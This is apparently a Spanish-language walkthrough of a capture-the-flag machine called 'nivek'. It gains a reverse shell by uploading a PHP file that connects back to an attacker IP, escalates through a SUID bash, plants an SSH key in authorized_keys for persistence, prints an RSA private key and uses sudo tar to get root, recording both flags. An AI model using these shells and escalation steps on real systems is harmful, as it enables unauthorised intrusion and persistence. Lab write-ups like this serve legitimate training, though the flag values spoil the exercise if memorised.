!\[\[Pasted image 20240524153900.png]] !\[\[Pasted image 20240524153926.png]]

Hecho esto ya estariamos dentro del panel...

Si inspeccionamos el codigo veremos que hay un link comentado llamado `setting.php`...

```html
<!-- <li class="">
<a href="setting.php">
<span class="pcoded-micon"><i class="feather icon-bookmark"></i></span>
<span class="pcoded-mtext">Settings</span>
</a>
</li> -->
```

Dentro de esta parte, veremos que podemos subir archivos, por lo que intentaremos hacer una Reverse Shell...

Crearemos el siguiente archivo, yo lo llamare `shell.php`...

```php
<?php
$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

Una vez tengamos el archivo creado, le daremos a `browser` para subir el archivo `shell.php`, pero antes estaremos a la escucha...

```shell
nc -lvnp <PORT>
```

Una vez estando a la escucha le daremos al boton para subir el archivo, una vez hecho esto nos hara una `shell` con el servidor como `deamon`...

Una vez teniendo la shell la sanitizamos...

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

Si nos vamos a la `/home/` de `nivek` veremos la flag...

> local.txt (falg1)

```
3bbf8c168408f1d5ff9dfd91fc00d0c1
```

Si hacemos lo siguiente...

```shell
find / -type f -perm -4000 -ls 2>/dev/null
```

Info:

```
393291     44 -rwsr-xr-x   1 root     root        44168 May  8  2014 /bin/ping
   393277     40 -rwsr-xr-x   1 root     root        40152 Apr 14  2016 /bin/mount
   409486     32 -rwsr-xr-x   1 root     root        30800 Mar 11  2016 /bin/fusermount
   393308     40 -rwsr-xr-x   1 root     root        40128 Mar 29  2016 /bin/su
   393292     44 -rwsr-xr-x   1 root     root        44680 May  8  2014 /bin/ping6
   409521    140 -rwsr-xr-x   1 root     root       142032 Feb 18  2016 /bin/ntfs-3g
   393326     28 -rwsr-xr-x   1 root     root        27608 Apr 14  2016 /bin/umount
   262384     52 -rwsr-xr-x   1 root     root        49584 Mar 29  2016 /usr/bin/chfn
   262606    136 -rwsr-xr-x   1 root     root       136808 Mar 31  2016 /usr/bin/sudo
   277153     24 -rwsr-xr-x   1 root     root        23304 Apr 16  2016 /usr/bin/ubuntu-core-launcher
   275657     36 -rwsr-xr-x   1 root     root        32944 Mar 29  2016 /usr/bin/newgidmap
   342109   1016 -rwsr-xr-x   1 eren     eren      1037464 Jul 26  2021 /usr/bin/bash
   262522     56 -rwsr-xr-x   1 root     root        54256 Mar 29  2016 /usr/bin/passwd
   277113     24 -rwsr-xr-x   1 root     root        23376 Jan 18  2016 /usr/bin/pkexec
   262511     40 -rwsr-xr-x   1 root     root        39904 Mar 29  2016 /usr/bin/newgrp
   262386     40 -rwsr-xr-x   1 root     root        40432 Mar 29  2016 /usr/bin/chsh
   276626     52 -rwsr-sr-x   1 daemon   daemon      51464 Jan 15  2016 /usr/bin/at
   275658     36 -rwsr-xr-x   1 root     root        32944 Mar 29  2016 /usr/bin/newuidmap
   262447     76 -rwsr-xr-x   1 root     root        75304 Mar 29  2016 /usr/bin/gpasswd
   262707     12 -rwsr-xr-x   1 root     root        10240 Feb 25  2014 /usr/lib/eject/dmcrypt-get-device
   285021     44 -rwsr-xr--   1 root     messagebus    42992 Jun 12  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   275644     40 -rwsr-xr-x   1 root     root          38984 Apr 19  2016 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
   342121    420 -rwsr-xr-x   1 root     root         428240 May 27  2020 /usr/lib/openssh/ssh-keysign
   277108     16 -rwsr-xr-x   1 root     root          14864 Jan 18  2016 /usr/lib/policykit-1/polkit-agent-helper-1
   298597    388 -rwsr-xr--   1 root     dip          394984 Jul 23  2020 /usr/sbin/pppd
   168815     16 -rwsr-xr-x   1 root     root          14704 Jul  7  2021 /opt/lampp/bin/suexec
```

```
342109   1016 -rwsr-xr-x   1 eren     eren      1037464 Jul 26  2021 /usr/bin/bash
```

Veremos que podemos ejecutar `/usr/bin/bash` como el usuario `eren`, por lo que si hacemos lo siguiente...

```shell
/usr/bin/bash -p
```

Con esto ya seremos `eren`...

Ahora lo que haremos sera crear una clave publica y privada para poder conectarnos mediante `eren` por `ssh` y asi poder hacer `sudo -l` sin que nos pida una contraseña...

Por lo que haremos lo siguiente...

```shell
ssh-keygen -t rsa -b 4096 -f /home/eren/.ssh/id_rsa
```

Info:

```
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/eren/.ssh/id_rsa.
Your public key has been saved in /home/eren/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:IT5iC3MMX/AEURDTJGamZo7qqLYuhWayD38Rx1TSe40 daemon@nivek
The key's randomart image is:
+---[RSA 4096]----+
|    %O=o.        |
|   = *o..        |
|  =  o+ .. o     |
| = +.oo...E .    |
|..+ *oo S.       |
|+o.=.o .         |
|*o  ..           |
|=+  .            |
|B=+.             |
+----[SHA256]-----+
```

Le daremos `<ENTER>` a todo sin rellenar nada, hecho esto ya habremos creado las 2 claves...

A parte de todo esto crearemos el siguiente archivo llamado `authorized_keys` para poder conectarnos por `ssh` con el `id_rsa` privado...

```shell
nano /home/eren/.ssh/authorized_keys
```

Dentro de este archivo hay que pegar el contenido de la `id_rsa.pub`...

```shell
#Contenido del archivo...
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDgbmsJdZdSVHBPsy7FucRB0463j0Sw7sHkipKBMmcV23QHaBwXdXaeRlSa4PqsBLd/QgUjmTfhs593h3AXz7vS65bzYstPILZOBcF3lViVxMk1n0XkBPhSPrMRPznuqFf5tAoPZ3xGGrbCLGtFE/Y5jgjLb0xk1znDU6pSIYUXsTGJNGQ4qLlPCGyRfXwrUQNyH9AI0DYhGxc3imIzwgpG6q/g2koMdu9i9QL2gcKfgTHFhSdPcE0p2wdbxmHoX7yshZeh66tZggDr6+SCDrlXHmxBJL5zUEy+zo4trcohEvcCA1vB4jAaaY3Zlep5y9bpZTcbyEr6brvLjxUaNlsHJdjw21R9wGObzNYYCq07PtzDEtyatgEl+hI59QlqemC6S51K5JkJO4wOQKJak9by6XAq38kBSTDxzywpQ4K406O7YD2fYQQR1LLNfGBbcHuAXnej5XblrFC1Z6Bvgp1cleejP1HSqvrmSkZxtftnjfWNs0f7m6SDXW0HcoxeAgfY2+YhjUIa9MWAYCgLcRRMmPJ5Q0g5WxNPFfpZEvX+ROW8Yodluo2ozFj9wq4KO5eJbUZ9xpaYT1P1AANIcxr6z9PSOtOIKYO7bmPpZ04LbcMl/5PB4HjSRD4ywqL7NztodUHjyxPBoRebhwL65wsQNjgXNat9b74BDwizwK/9kQ== daemon@nivek
```

Y nos copiaremos el contenido de la `id_rsa` privada...

```
-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----
```

En nuestro `host` utilizaremos el `id_rsa` privado para conectarnos con el mismo...

```shell
chmod 600 id_rsa
```

```shell
ssh -i id_rsa eren@<IP>
```

Y con esto ya estariamos dentro, pero si hacemos `sudo -l` veremos lo siguiente...

```
Matching Defaults entries for eren on nivek:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User eren may run the following commands on nivek:
    (root) NOPASSWD: /bin/tar
```

Por lo que haremos esto...

```shell
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

Con esto ya seriamos `root` asi que leemo la flag...

> root.txt (flag2)

```
299c10117c1940f21b70a391ca125c5d
```
